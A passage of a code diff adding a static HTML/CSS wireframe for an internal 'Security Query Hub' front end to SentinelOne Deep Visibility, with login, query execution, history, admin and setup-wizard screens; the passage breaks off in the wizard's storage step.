@@ -1,0 +1,1427 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Query Hub</title>
+<style>
+/* ===== CSS Variables / Theming ===== */
+:root {
+  --font-mono: 'Courier New', Courier, monospace;
+  --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
+  --radius: 6px;
+  --transition: 0.2s ease;
+}
+[data-theme="dark"] {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #21262d;
+  --bg-input: #0d1117;
+  --border: #30363d;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #484f58;
+  --accent: #58a6ff;
+  --accent-hover: #79c0ff;
+  --success: #3fb950;
+  --warning: #d29922;
+  --danger: #f85149;
+  --danger-hover: #ff6e6a;
+  --info: #58a6ff;
+  --badge-bg: rgba(88,166,255,0.15);
+  --shadow: 0 2px 8px rgba(0,0,0,0.4);
+  --table-stripe: rgba(255,255,255,0.02);
+  --overlay: rgba(0,0,0,0.6);
+}
+[data-theme="light"] {
+  --bg-primary: #ffffff;
+  --bg-secondary: #f6f8fa;
+  --bg-tertiary: #eaeef2;
+  --bg-input: #ffffff;
+  --border: #d0d7de;
+  --text-primary: #1f2328;
+  --text-secondary: #656d76;
+  --text-muted: #8b949e;
+  --accent: #0969da;
+  --accent-hover: #0550ae;
+  --success: #1a7f37;
+  --warning: #9a6700;
+  --danger: #cf222e;
+  --danger-hover: #a40e26;
+  --info: #0969da;
+  --badge-bg: rgba(9,105,218,0.1);
+  --shadow: 0 2px 8px rgba(0,0,0,0.1);
+  --table-stripe: rgba(0,0,0,0.02);
+  --overlay: rgba(0,0,0,0.4);
+}
+
+/* ===== Reset & Base ===== */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: var(--font-sans);
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.5;
+  min-height: 100vh;
+}
+a { color: var(--accent); text-decoration: none; }
+a:hover { color: var(--accent-hover); }
+
+/* ===== Utility ===== */
+.hidden { display: none !important; }
+.flex { display: flex; }
+.flex-col { flex-direction: column; }
+.items-center { align-items: center; }
+.justify-between { justify-content: space-between; }
+.gap-sm { gap: 8px; }
+.gap-md { gap: 16px; }
+.gap-lg { gap: 24px; }
+.mt-sm { margin-top: 8px; }
+.mt-md { margin-top: 16px; }
+.mt-lg { margin-top: 24px; }
+.mb-md { margin-bottom: 16px; }
+.text-center { text-align: center; }
+.text-sm { font-size: 0.85rem; }
+.text-muted { color: var(--text-secondary); }
+.text-danger { color: var(--danger); }
+.text-success { color: var(--success); }
+.text-warning { color: var(--warning); }
+.w-full { width: 100%; }
+
+/* ===== Buttons ===== */
+.btn {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 8px 16px; border: 1px solid var(--border); border-radius: var(--radius);
+  background: var(--bg-tertiary); color: var(--text-primary);
+  font-size: 0.875rem; cursor: pointer; transition: all var(--transition);
+  font-family: var(--font-sans); white-space: nowrap;
+}
+.btn:hover { border-color: var(--text-secondary); }
+.btn-primary { background: var(--accent); color: #fff; border-color: var(--accent); }
+.btn-primary:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
+.btn-danger { background: var(--danger); color: #fff; border-color: var(--danger); }
+.btn-danger:hover { background: var(--danger-hover); border-color: var(--danger-hover); }
+.btn-success { background: var(--success); color: #fff; border-color: var(--success); }
+.btn-sm { padding: 4px 10px; font-size: 0.8rem; }
+.btn-icon { padding: 6px 8px; }
+
+/* ===== Form Controls ===== */
+input, select, textarea {
+  padding: 8px 12px; border: 1px solid var(--border); border-radius: var(--radius);
+  background: var(--bg-input); color: var(--text-primary);
+  font-size: 0.875rem; font-family: var(--font-sans);
+  transition: border-color var(--transition);
+}
+input:focus, select:focus, textarea:focus {
+  outline: none; border-color: var(--accent);
+}
+label { font-size: 0.85rem; color: var(--text-secondary); font-weight: 500; }
+.form-group { display: flex; flex-direction: column; gap: 4px; }
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+
+/* ===== Cards ===== */
+.card {
+  background: var(--bg-secondary); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 20px;
+}
+.card-header {
+  font-size: 1rem; font-weight: 600; margin-bottom: 16px;
+  padding-bottom: 12px; border-bottom: 1px solid var(--border);
+}
+
+/* ===== Badges ===== */
+.badge {
+  display: inline-flex; align-items: center; padding: 2px 8px;
+  border-radius: 12px; font-size: 0.75rem; font-weight: 500;
+}
+.badge-info { background: var(--badge-bg); color: var(--accent); }
+.badge-success { background: rgba(63,185,80,0.15); color: var(--success); }
+.badge-warning { background: rgba(210,153,34,0.15); color: var(--warning); }
+.badge-danger { background: rgba(248,81,73,0.15); color: var(--danger); }
+.badge-muted { background: var(--bg-tertiary); color: var(--text-secondary); }
+
+/* ===== Tables ===== */
+.table-wrap { overflow-x: auto; border: 1px solid var(--border); border-radius: var(--radius); }
+table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+th {
+  padding: 10px 12px; text-align: left; font-weight: 600;
+  background: var(--bg-tertiary); border-bottom: 1px solid var(--border);
+  color: var(--text-secondary); cursor: pointer; user-select: none;
+  white-space: nowrap;
+}
+th:hover { color: var(--text-primary); }
+th .sort-arrow { margin-left: 4px; font-size: 0.7rem; }
+td {
+  padding: 8px 12px; border-bottom: 1px solid var(--border);
+  white-space: nowrap; max-width: 300px; overflow: hidden; text-overflow: ellipsis;
+}
+tr:nth-child(even) { background: var(--table-stripe); }
+tr:hover { background: var(--bg-tertiary); }
+
+/* ===== Login Screen ===== */
+#login-screen {
+  display: flex; align-items: center; justify-content: center;
+  min-height: 100vh; padding: 20px;
+}
+.login-box {
+  width: 100%; max-width: 400px; background: var(--bg-secondary);
+  border: 1px solid var(--border); border-radius: 8px;
+  padding: 40px 32px; box-shadow: var(--shadow);
+}
+.login-box h1 { font-size: 1.5rem; margin-bottom: 4px; }
+.login-box .subtitle { color: var(--text-secondary); margin-bottom: 24px; font-size: 0.9rem; }
+.login-box .form-group { margin-bottom: 16px; }
+.login-box input { width: 100%; }
+.login-box .btn { width: 100%; justify-content: center; padding: 10px; }
+.login-error {
+  background: rgba(248,81,73,0.1); border: 1px solid var(--danger);
+  color: var(--danger); padding: 8px 12px; border-radius: var(--radius);
+  font-size: 0.85rem; margin-bottom: 16px;
+}
+.shield-icon { font-size: 2.5rem; margin-bottom: 12px; }
+
+/* ===== Password Change Screen ===== */
+#password-change-screen {
+  display: none; align-items: center; justify-content: center;
+  min-height: 100vh; padding: 20px;
+}
+
+/* ===== Main App Shell ===== */
+#app-shell { display: none; }
+.app-layout { display: flex; min-height: 100vh; }
+
+/* ===== Top Nav ===== */
+.topnav {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 20px; height: 52px; background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100;
+}
+.topnav-left { display: flex; align-items: center; gap: 24px; }
+.topnav-brand {
+  font-weight: 700; font-size: 1rem; color: var(--text-primary);
+  display: flex; align-items: center; gap: 8px;
+}
+.topnav-brand .shield { color: var(--accent); }
+.topnav-links { display: flex; gap: 4px; }
+.topnav-links a {
+  padding: 6px 12px; border-radius: var(--radius); font-size: 0.85rem;
+  color: var(--text-secondary); transition: all var(--transition);
+}
+.topnav-links a:hover, .topnav-links a.active {
+  background: var(--bg-tertiary); color: var(--text-primary);
+}
+.topnav-right { display: flex; align-items: center; gap: 16px; }
+
+/* Disk indicator in nav */
+.disk-indicator {
+  display: flex; align-items: center; gap: 6px; font-size: 0.8rem;
+  color: var(--text-secondary);
+}
+.disk-bar-mini {
+  width: 60px; height: 6px; background: var(--bg-tertiary);
+  border-radius: 3px; overflow: hidden;
+}
+.disk-bar-mini-fill { height: 100%; border-radius: 3px; transition: width 0.3s; }
+.disk-ok { background: var(--success); }
+.disk-warn { background: var(--warning); }
+.disk-crit { background: var(--danger); }
+
+/* Theme toggle */
+.theme-toggle {
+  background: none; border: none; color: var(--text-secondary);
+  cursor: pointer; font-size: 1.1rem; padding: 4px;
+}
+.theme-toggle:hover { color: var(--text-primary); }
+
+/* User menu */
+.user-menu {
+  position: relative; display: flex; align-items: center; gap: 6px;
+  cursor: pointer; padding: 4px 8px; border-radius: var(--radius);
+}
+.user-menu:hover { background: var(--bg-tertiary); }
+.user-avatar {
+  width: 28px; height: 28px; border-radius: 50%; background: var(--accent);
+  color: #fff; display: flex; align-items: center; justify-content: center;
+  font-size: 0.75rem; font-weight: 600;
+}
+.user-menu-name { font-size: 0.85rem; }
+.user-dropdown {
+  position: absolute; top: 100%; right: 0; margin-top: 4px;
+  background: var(--bg-secondary); border: 1px solid var(--border);
+  border-radius: var(--radius); box-shadow: var(--shadow);
+  min-width: 180px; z-index: 200; display: none;
+}
+.user-dropdown.show { display: block; }
+.user-dropdown a, .user-dropdown button {
+  display: block; width: 100%; padding: 8px 14px; text-align: left;
+  font-size: 0.85rem; color: var(--text-primary); background: none;
+  border: none; cursor: pointer; font-family: var(--font-sans);
+}
+.user-dropdown a:hover, .user-dropdown button:hover { background: var(--bg-tertiary); }
+.user-dropdown .divider { border-top: 1px solid var(--border); margin: 4px 0; }
+
+/* ===== Page Content ===== */
+.page-content { flex: 1; padding: 24px; max-width: 1400px; margin: 0 auto; width: 100%; }
+.page-header {
+  display: flex; align-items: center; justify-content: space-between;
+  margin-bottom: 24px;
+}
+.page-header h2 { font-size: 1.25rem; }
+
+/* ===== Query Execution Page ===== */
+.query-grid { display: grid; grid-template-columns: 340px 1fr; gap: 24px; }
+@media (max-width: 900px) { .query-grid { grid-template-columns: 1fr; } }
+.query-list { display: flex; flex-direction: column; gap: 8px; }
+.query-card {
+  padding: 12px 16px; background: var(--bg-secondary); border: 1px solid var(--border);
+  border-radius: var(--radius); cursor: pointer; transition: all var(--transition);
+}
+.query-card:hover { border-color: var(--accent); }
+.query-card.selected { border-color: var(--accent); background: var(--badge-bg); }
+.query-card-title { font-weight: 600; font-size: 0.9rem; margin-bottom: 2px; }
+.query-card-desc { font-size: 0.8rem; color: var(--text-secondary); }
+.query-card-meta { display: flex; gap: 8px; margin-top: 6px; }
+.category-filter {
+  display: flex; gap: 4px; flex-wrap: wrap; margin-bottom: 12px;
+}
+.category-filter button {
+  padding: 4px 10px; border: 1px solid var(--border); border-radius: 16px;
+  background: var(--bg-tertiary); color: var(--text-secondary);
+  font-size: 0.75rem; cursor: pointer; transition: all var(--transition);
+  font-family: var(--font-sans);
+}
+.category-filter button:hover, .category-filter button.active {
+  border-color: var(--accent); color: var(--accent); background: var(--badge-bg);
+}
+
+/* Query detail panel */
+.query-detail { min-height: 300px; }
+.query-detail .empty-state {
+  display: flex; align-items: center; justify-content: center;
+  height: 300px; color: var(--text-muted); font-size: 0.9rem;
+}
+.param-form { display: flex; flex-direction: column; gap: 16px; }
+.param-field label { display: flex; align-items: center; gap: 6px; }
+.param-field .param-type { font-size: 0.7rem; color: var(--text-muted); font-weight: 400; }
+.param-field input, .param-field select { width: 100%; }
+
+/* ===== Results section ===== */
+.results-toolbar {
+  display: flex; align-items: center; justify-content: space-between;
+  flex-wrap: wrap; gap: 12px; margin-bottom: 16px;
+}
+.results-toolbar .search-box { width: 280px; }
+.results-meta { font-size: 0.85rem; color: var(--text-secondary); }
+.export-dropdown { position: relative; }
+.export-menu {
+  position: absolute; top: 100%; right: 0; margin-top: 4px;
+  background: var(--bg-secondary); border: 1px solid var(--border);
+  border-radius: var(--radius); box-shadow: var(--shadow);
+  min-width: 140px; z-index: 50; display: none;
+}
+.export-menu.show { display: block; }
+.export-menu button {
+  display: block; width: 100%; padding: 8px 14px; text-align: left;
+  font-size: 0.85rem; color: var(--text-primary); background: none;
+  border: none; cursor: pointer; font-family: var(--font-sans);
+}
+.export-menu button:hover { background: var(--bg-tertiary); }
+
+/* Loading spinner */
+.spinner {
+  display: inline-block; width: 20px; height: 20px;
+  border: 2px solid var(--border); border-top-color: var(--accent);
+  border-radius: 50%; animation: spin 0.6s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.loading-overlay {
+  display: flex; flex-direction: column; align-items: center;
+  justify-content: center; gap: 12px; padding: 60px; color: var(--text-secondary);
+}
+.loading-overlay .spinner { width: 32px; height: 32px; border-width: 3px; }
+
+/* ===== Query History ===== */
+.history-filters {
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 16px;
+}
+.history-filters select, .history-filters input { font-size: 0.85rem; }
+.shared-badge { color: var(--accent); font-size: 0.8rem; margin-left: 4px; }
+
+/* ===== Admin Panel ===== */
+.admin-layout { display: flex; gap: 0; }
+.admin-sidebar {
+  width: 220px; min-height: calc(100vh - 52px); background: var(--bg-secondary);
+  border-right: 1px solid var(--border); padding: 16px 0; flex-shrink: 0;
+}
+.admin-sidebar a {
+  display: flex; align-items: center; gap: 8px;
+  padding: 8px 20px; font-size: 0.85rem; color: var(--text-secondary);
+  transition: all var(--transition);
+}
+.admin-sidebar a:hover { background: var(--bg-tertiary); color: var(--text-primary); }
+.admin-sidebar a.active { color: var(--accent); background: var(--badge-bg); border-right: 2px solid var(--accent); }
+.admin-sidebar .sidebar-section {
+  padding: 6px 20px; font-size: 0.7rem; font-weight: 600;
+  text-transform: uppercase; letter-spacing: 0.05em;
+  color: var(--text-muted); margin-top: 16px;
+}
+.admin-content { flex: 1; padding: 24px; max-width: 1100px; }
+
+/* Disk usage card */
+.disk-usage-card { max-width: 600px; }
+.disk-bar-large {
+  width: 100%; height: 24px; background: var(--bg-tertiary);
+  border-radius: 12px; overflow: hidden; position: relative; margin: 12px 0;
+}
+.disk-bar-large-fill { height: 100%; border-radius: 12px; transition: width 0.5s; }
+.disk-threshold-line {
+  position: absolute; top: 0; bottom: 0; width: 2px;
+  background: var(--warning); z-index: 2;
+}
+.disk-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-top: 16px; }
+.disk-stat { text-align: center; }
+.disk-stat-value { font-size: 1.5rem; font-weight: 700; }
+.disk-stat-label { font-size: 0.8rem; color: var(--text-secondary); }
+
+/* Setup wizard */
+.wizard-steps {
+  display: flex; gap: 4px; margin-bottom: 24px;
+  border-bottom: 1px solid var(--border); padding-bottom: 16px;
+}
+.wizard-step {
+  display: flex; align-items: center; gap: 6px;
+  padding: 6px 12px; font-size: 0.85rem; color: var(--text-muted);
+}
+.wizard-step .step-num {
+  width: 24px; height: 24px; border-radius: 50%; display: flex;
+  align-items: center; justify-content: center; font-size: 0.75rem;
+  font-weight: 600; background: var(--bg-tertiary); border: 1px solid var(--border);
+}
+.wizard-step.active { color: var(--accent); }
+.wizard-step.active .step-num { background: var(--accent); color: #fff; border-color: var(--accent); }
+.wizard-step.completed { color: var(--success); }
+.wizard-step.completed .step-num { background: var(--success); color: #fff; border-color: var(--success); }
+.wizard-content { max-width: 500px; }
+
+/* Modal */
+.modal-overlay {
+  position: fixed; inset: 0; background: var(--overlay);
+  display: flex; align-items: center; justify-content: center; z-index: 500;
+}
+.modal {
+  background: var(--bg-secondary); border: 1px solid var(--border);
+  border-radius: 8px; padding: 24px; width: 90%; max-width: 500px;
+  box-shadow: var(--shadow);
+}
+.modal h3 { margin-bottom: 16px; font-size: 1.1rem; }
+.modal-actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 20px; }
+
+/* Toast */
+.toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 600; display: flex; flex-direction: column; gap: 8px; }
+.toast {
+  padding: 12px 20px; border-radius: var(--radius); font-size: 0.85rem;
+  box-shadow: var(--shadow); animation: slideIn 0.3s ease;
+  display: flex; align-items: center; gap: 8px;
+}
+.toast-success { background: var(--success); color: #fff; }
+.toast-error { background: var(--danger); color: #fff; }
+.toast-info { background: var(--accent); color: #fff; }
+@keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+/* Status dot */
+.status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+.status-active { background: var(--success); }
+.status-inactive { background: var(--text-muted); }
+</style>
+</head>
+<body>
+
+<!-- ==================== LOGIN SCREEN ==================== -->
+<div id="login-screen">
+  <div class="login-box">
+    <div class="text-center">
+      <div class="shield-icon">&#128737;</div>
+      <h1>Security Query Hub</h1>
+      <p class="subtitle">SentinelOne Deep Visibility Interface</p>
+    </div>
+    <div id="login-error" class="login-error hidden">Invalid username or password.</div>
+    <div class="form-group">
+      <label for="login-user">Username</label>
+      <input type="text" id="login-user" placeholder="Enter username" value="admin">
+    </div>
+    <div class="form-group mt-md">
+      <label for="login-pass">Password</label>
+      <input type="password" id="login-pass" placeholder="Enter password" value="admin">
+    </div>
+    <button class="btn btn-primary mt-lg" onclick="handleLogin()">Sign In</button>
+    <p class="text-center text-sm text-muted mt-md">Internal Use Only &mdash; VPN Required</p>
+  </div>
+</div>
+
+<!-- ==================== FORCED PASSWORD CHANGE ==================== -->
+<div id="password-change-screen">
+  <div class="login-box">
+    <div class="text-center">
+      <div class="shield-icon">&#128272;</div>
+      <h1>Change Password</h1>
+      <p class="subtitle">You must change your default password before continuing.</p>
+    </div>
+    <div class="form-group">
+      <label>Current Password</label>
+      <input type="password" value="admin" disabled style="opacity:0.5">
+    </div>
+    <div class="form-group mt-md">
+      <label for="new-pass-1">New Password</label>
+      <input type="password" id="new-pass-1" placeholder="Enter new password">
+    </div>
+    <div class="form-group mt-md">
+      <label for="new-pass-2">Confirm New Password</label>
+      <input type="password" id="new-pass-2" placeholder="Confirm new password">
+    </div>
+    <button class="btn btn-primary mt-lg" onclick="handlePasswordChange()">Update Password &amp; Continue</button>
+    <p class="text-center text-sm text-muted mt-md">Minimum 8 characters required</p>
+  </div>
+</div>
+
+<!-- ==================== MAIN APP SHELL ==================== -->
+<div id="app-shell">
+
+  <!-- Top Navigation -->
+  <nav class="topnav">
+    <div class="topnav-left">
+      <div class="topnav-brand">
+        <span class="shield">&#128737;</span> Security Query Hub
+      </div>
+      <div class="topnav-links">
+        <a href="#" class="active" data-page="query-exec" onclick="showPage('query-exec')">Run Query</a>
+        <a href="#" data-page="history" onclick="showPage('history')">History</a>
+        <a href="#" data-page="admin" onclick="showPage('admin')" id="admin-nav-link">Admin Panel</a>
+      </div>
+    </div>
+    <div class="topnav-right">
+      <div class="disk-indicator" title="Disk Usage: 43.2 GB / 100 GB (43%)">
+        <span>&#128190;</span>
+        <div class="disk-bar-mini">
+          <div class="disk-bar-mini-fill disk-ok" style="width: 43%"></div>
+        </div>
+        <span class="text-sm">43%</span>
+      </div>
+      <button class="theme-toggle" onclick="toggleTheme()" title="Toggle light/dark mode">
+        <span id="theme-icon">&#9788;</span>
+      </button>
+      <div class="user-menu" onclick="toggleUserMenu(event)">
+        <div class="user-avatar" id="user-avatar">A</div>
+        <span class="user-menu-name" id="user-display-name">admin</span>
+        <span style="font-size:0.6rem">&#9660;</span>
+        <div class="user-dropdown" id="user-dropdown">
+          <div style="padding:10px 14px;border-bottom:1px solid var(--border)">
+            <div style="font-weight:600;font-size:0.85rem" id="dropdown-fullname">Administrator</div>
+            <div class="text-sm text-muted" id="dropdown-role">Admin</div>
+          </div>
+          <button onclick="showToast('Account settings not available in wireframe','info')">Account Settings</button>
+          <div class="divider"></div>
+          <button onclick="handleLogout()">Sign Out</button>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- ==================== QUERY EXECUTION PAGE ==================== -->
+  <div id="page-query-exec" class="page-content">
+    <div class="page-header">
+      <h2>Run Query</h2>
+      <div class="text-sm text-muted">Select a stored query, fill in parameters, and execute</div>
+    </div>
+
+    <div class="query-grid">
+      <!-- Left: Query List -->
+      <div>
+        <div class="category-filter" id="category-filter"></div>
+        <div class="query-list" id="query-list"></div>
+      </div>
+
+      <!-- Right: Query Detail + Params -->
+      <div class="query-detail card" id="query-detail">
+        <div class="empty-state">Select a query from the list to get started</div>
+      </div>
+    </div>
+
+    <!-- Results area (shown after running) -->
+    <div id="results-area" class="hidden mt-lg">
+      <div class="card">
+        <div class="card-header flex justify-between items-center">
+          <span>Query Results</span>
+          <span class="results-meta" id="results-meta"></span>
+        </div>
+        <div class="results-toolbar">
+          <input type="text" class="search-box" placeholder="Filter results..." id="results-filter" oninput="filterResults()">
+          <div class="flex gap-sm">
+            <button class="btn btn-success btn-sm" onclick="shareResults()">&#8599; Share with All Users</button>
+            <div class="export-dropdown">
+              <button class="btn btn-sm" onclick="toggleExportMenu()">&#8615; Export</button>
+              <div class="export-menu" id="export-menu">
+                <button onclick="exportData('csv')">Export as CSV</button>
+                <button onclick="exportData('json')">Export as JSON</button>
+                <button onclick="exportData('pdf')">Export as PDF</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="table-wrap">
+          <table id="results-table">
+            <thead id="results-thead"></thead>
+            <tbody id="results-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- Loading overlay -->
+    <div id="query-loading" class="hidden mt-lg">
+      <div class="card">
+        <div class="loading-overlay">
+          <div class="spinner"></div>
+          <div>Executing Deep Visibility query...</div>
+          <div class="text-sm text-muted">This may take up to 30 seconds</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== HISTORY PAGE ==================== -->
+  <div id="page-history" class="page-content hidden">
+    <div class="page-header">
+      <h2>Query History</h2>
+      <div class="text-sm text-muted">Your executed queries and shared results</div>
+    </div>
+    <div class="history-filters">
+      <select id="history-scope">
+        <option value="all">All (My Queries + Shared)</option>
+        <option value="mine">My Queries Only</option>
+        <option value="shared">Shared Only</option>
+      </select>
+      <select id="history-status">
+        <option value="all">All Statuses</option>
+        <option value="success">Success</option>
+        <option value="error">Error</option>
+      </select>
+      <input type="text" placeholder="Search history..." id="history-search" style="width:220px">
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Query Name</th>
+            <th>Category</th>
+            <th>Parameters</th>
+            <th>Run By</th>
+            <th>Executed</th>
+            <th>Status</th>
+            <th>Shared</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="history-tbody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ==================== ADMIN PANEL ==================== -->
+  <div id="page-admin" class="page-content hidden" style="padding:0;max-width:none">
+    <div class="admin-layout">
+      <div class="admin-sidebar">
+        <div class="admin-sidebar-section" style="padding:6px 20px;font-size:0.7rem;font-weight:600;text-transform:uppercase;letter-spacing:0.05em;color:var(--text-muted)">Management</div>
+        <a href="#" class="active" data-admin="users" onclick="showAdminTab('users')">&#128100; User Management</a>
+        <a href="#" data-admin="queries" onclick="showAdminTab('queries')">&#128269; Stored Queries</a>
+        <a href="#" data-admin="history-mgmt" onclick="showAdminTab('history-mgmt')">&#128203; Query History</a>
+        <div style="padding:6px 20px;font-size:0.7rem;font-weight:600;text-transform:uppercase;letter-spacing:0.05em;color:var(--text-muted);margin-top:16px">System</div>
+        <a href="#" data-admin="disk" onclick="showAdminTab('disk')">&#128190; Disk Usage</a>
+        <a href="#" data-admin="wizard" onclick="showAdminTab('wizard')">&#9881; Setup Wizard</a>
+      </div>
+      <div class="admin-content">
+
+        <!-- Admin: User Management -->
+        <div id="admin-users">
+          <div class="page-header">
+            <h2>User Management</h2>
+            <button class="btn btn-primary btn-sm" onclick="openModal('create-user')">+ Create User</button>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Username</th><th>Full Name</th><th>Role</th><th>Status</th><th>Created</th><th>Last Login</th><th>Actions</th></tr>
+              </thead>
+              <tbody id="admin-users-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Admin: Stored Queries -->
+        <div id="admin-queries" class="hidden">
+          <div class="page-header">
+            <h2>Stored Queries</h2>
+            <button class="btn btn-primary btn-sm" onclick="openModal('create-query')">+ Create Query</button>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Name</th><th>Category</th><th>Parameters</th><th>Created By</th><th>Last Modified</th><th>Actions</th></tr>
+              </thead>
+              <tbody id="admin-queries-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Admin: Query History Management -->
+        <div id="admin-history-mgmt" class="hidden">
+          <div class="page-header">
+            <h2>Query History Management</h2>
+          </div>
+          <div class="card mb-md" style="max-width:600px">
+            <div class="card-header">Bulk Delete Operations</div>
+            <div class="flex flex-col gap-md">
+              <div class="flex justify-between items-center">
+                <div>
+                  <div style="font-weight:500;font-size:0.9rem">Delete All History</div>
+                  <div class="text-sm text-muted">Permanently remove all query history and results</div>
+                </div>
+                <button class="btn btn-danger btn-sm" onclick="showToast('All query history deleted (demo)','info')">Delete All</button>
+              </div>
+              <div style="border-top:1px solid var(--border);padding-top:16px" class="flex justify-between items-center">
+                <div>
+                  <div style="font-weight:500;font-size:0.9rem">Delete Last 30 Days</div>
+                  <div class="text-sm text-muted">Remove history from the past 30 days only</div>
+                </div>
+                <button class="btn btn-danger btn-sm" onclick="showToast('Last 30 days deleted (demo)','info')">Delete 30 Days</button>
+              </div>
+              <div style="border-top:1px solid var(--border);padding-top:16px">
+                <div style="font-weight:500;font-size:0.9rem;margin-bottom:8px">Delete by Date Range</div>
+                <div class="flex gap-sm items-center">
+                  <input type="date" id="del-start" value="2026-02-01">
+                  <span class="text-muted">to</span>
+                  <input type="date" id="del-end" value="2026-03-13">
+                  <button class="btn btn-danger btn-sm" onclick="showToast('Date range history deleted (demo)','info')">Delete Range</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="text-sm text-muted">Total history entries: <strong>247</strong> &mdash; Total result data: <strong>12.8 GB</strong></div>
+        </div>
+
+        <!-- Admin: Disk Usage -->
+        <div id="admin-disk" class="hidden">
+          <div class="page-header">
+            <h2>Disk Usage</h2>
+          </div>
+          <div class="card disk-usage-card">
+            <div class="card-header">Storage Overview</div>
+            <div style="display:flex;justify-content:space-between;font-size:0.9rem">
+              <span>43.2 GB used of 100 GB</span>
+              <span class="text-success" style="font-weight:600">43% &mdash; Healthy</span>
+            </div>
+            <div class="disk-bar-large">
+              <div class="disk-bar-large-fill disk-ok" style="width:43%"></div>
+              <div class="disk-threshold-line" style="left:70%" title="Cleanup threshold: 70%"></div>
+            </div>
+            <div class="flex justify-between text-sm text-muted" style="margin-top:4px">
+              <span>0 GB</span>
+              <span style="color:var(--warning)">70 GB (threshold)</span>
+              <span>100 GB</span>
+            </div>
+            <div class="disk-stats">
+              <div class="disk-stat">
+                <div class="disk-stat-value" style="color:var(--accent)">43.2 <span style="font-size:0.9rem">GB</span></div>
+                <div class="disk-stat-label">Used</div>
+              </div>
+              <div class="disk-stat">
+                <div class="disk-stat-value" style="color:var(--success)">56.8 <span style="font-size:0.9rem">GB</span></div>
+                <div class="disk-stat-label">Available</div>
+              </div>
+              <div class="disk-stat">
+                <div class="disk-stat-value" style="color:var(--warning)">26.8 <span style="font-size:0.9rem">GB</span></div>
+                <div class="disk-stat-label">Until Cleanup</div>
+              </div>
+            </div>
+          </div>
+          <div class="card mt-lg" style="max-width:600px">
+            <div class="card-header">Storage Breakdown</div>
+            <table style="font-size:0.85rem">
+              <tr><td style="padding:6px 12px">Query Results Data</td><td style="padding:6px 12px;text-align:right;font-weight:600">38.1 GB</td></tr>
+              <tr><td style="padding:6px 12px">SQLite Database</td><td style="padding:6px 12px;text-align:right;font-weight:600">2.4 GB</td></tr>
+              <tr><td style="padding:6px 12px">Application &amp; Logs</td><td style="padding:6px 12px;text-align:right;font-weight:600">1.8 GB</td></tr>
+              <tr><td style="padding:6px 12px">OS &amp; System</td><td style="padding:6px 12px;text-align:right;font-weight:600">0.9 GB</td></tr>
+            </table>
+          </div>
+        </div>
+
+        <!-- Admin: Setup Wizard -->
+        <div id="admin-wizard" class="hidden">
+          <div class="page-header">
+            <h2>Setup Wizard</h2>
+            <div class="text-sm text-muted">Configure core application settings</div>
+          </div>
+          <div class="wizard-steps" id="wizard-steps">
+            <div class="wizard-step active" data-step="1"><span class="step-num">1</span> S1 API</div>
+            <div class="wizard-step" data-step="2"><span class="step-num">2</span> Storage</div>
+            <div class="wizard-step" data-step="3"><span class="step-num">3</span> Sessions</div>
+            <div class="wizard-step" data-step="4"><span class="step-num">4</span> Passwords</div>
+            <div class="wizard-step" data-step="5"><span class="step-num">5</span> Retention</div>
+          </div>
+
+          <!-- Step 1: S1 API -->
+          <div class="wizard-content" id="wizard-step-1">
+            <h3 style="font-size:1rem;margin-bottom:16px">SentinelOne API Credentials</h3>
+            <div class="form-group mb-md">
+              <label>Base URL</label>
+              <input type="text" value="https://usea1-partners.sentinelone.net" style="width:100%">
+            </div>
+            <div class="form-group mb-md">
+              <label>API Key</label>
+              <input type="text" placeholder="Enter API key" style="width:100%">
+            </div>
+            <div class="form-group mb-md">
+              <label>API Secret</label>
+              <input type="password" placeholder="Enter API secret" style="width:100%">
+            </div>
+            <div class="form-group mb-md">
+              <label>API Version</label>
+              <select style="width:100%">
+                <option>v2.1 (Latest)</option>
+                <option>v2.0</option>
+              </select>
+            </div>
+            <div class="flex justify-between mt-lg">
+              <span></span>
+              <button class="btn btn-primary" onclick="wizardNext(2)">Next: Storage &#8594;</button>
+            </div>
+          </div>
+
+          <!-- Step 2: Storage -->
+          <div class="wizard-content hidden" id="wizard-step-2">
+            <h3 style="font-size:1rem;margin-bottom:16px">Disk Cleanup Threshold</h3>
+            <div class="form-group mb-md">
+              <label>Cleanup Trigger (%)</label>
+              <input type="number" value="70" min="50" max="95" style="width:120px">
+              <span class="text-sm text-muted mt-sm">FIFO cleanup starts when disk exceeds this percentage</span>
+            </div>
